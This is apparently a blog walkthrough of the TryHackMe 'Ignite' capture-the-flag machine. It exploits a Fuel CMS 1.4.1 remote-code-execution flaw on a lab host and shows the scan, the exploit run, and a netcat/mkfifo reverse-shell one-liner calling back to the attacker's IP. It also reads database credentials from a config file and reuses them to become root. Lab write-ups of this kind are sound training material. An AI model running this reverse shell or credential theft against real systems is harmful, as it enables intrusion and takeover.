---
title: Ignite
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Ignite machine
  on TryHackMe.
slug: ignite
---





> target - 10.201.65.81

> nmap

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

> Find webpotral and saw  `Fuel CMS`  so search vaulnerbility wia searchploit

```
┌──(alucard㉿alucard)-[~]
└─$ searchsploit fuel cms
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                            | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                           | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                  | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                      | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                    | php/webapps/50884.txt
-------------------------------------------------------------------------------------- -------------------------
```

> So in exploit tb found script in this cve using this cv i can run command

```
❯ ls
blog  exploit.py  ignite  rabithole  valley
❯ chmod +x exploit.py
❯ python exploit.py
usage: python3 exploit.py -u <url>
❯ python exploit.py -u http://10.201.65.81/
[+]Connecting...
Enter Command $whoami
systemwww-data

```

> So i run reverse shell in this command line

```
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.21.16.42 4242 >/tmp/f

```

> after gaining access to shell stable it

```
❯ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.21.16.42] from (UNKNOWN) [10.201.65.81] 38412
/bin/sh: 0: can't access tty; job control turned off
$ 
$ python -c 'import pty; pty.spawn("/bin/bash")'


```

> So i find flag.txt in

```
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls -la
ls -la
total 12
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
```

> So I invistigate more in this shell

```
www-data@ubuntu:/var$ ls
ls
backups  crash  local  log   metrics  run   spool  www
cache    lib    lock   mail  opt      snap  tmp
www-data@ubuntu:/var$ cd www
cd www
www-data@ubuntu:/var/www$ cd html
cd html
www-data@ubuntu:/var/www/html$ ls
ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
www-data@ubuntu:/var/www/html$ cd fuel
cd fuel
www-data@ubuntu:/var/www/html/fuel$ ls
ls
application  data_backup  install   modules
codeigniter  index.php    licenses  scripts
www-data@ubuntu:/var/www/html/fuel$ cd application
cd application
www-data@ubuntu:/var/www/html/fuel/application$ ls
ls
cache   controllers  helpers  index.html  libraries  migrations  third_party
config  core         hooks    language    logs       models      views
www-data@ubuntu:/var/www/html/fuel/application$ cd config
cd config
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
ls
MY_config.php        constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.pgp
cat database.pgp
cat: database.pgp: No such file or directory
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php

```

> So in this database found username and pwd

```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
		`root`
		`mememe`
```

> So using pwd login to root and find root.txt

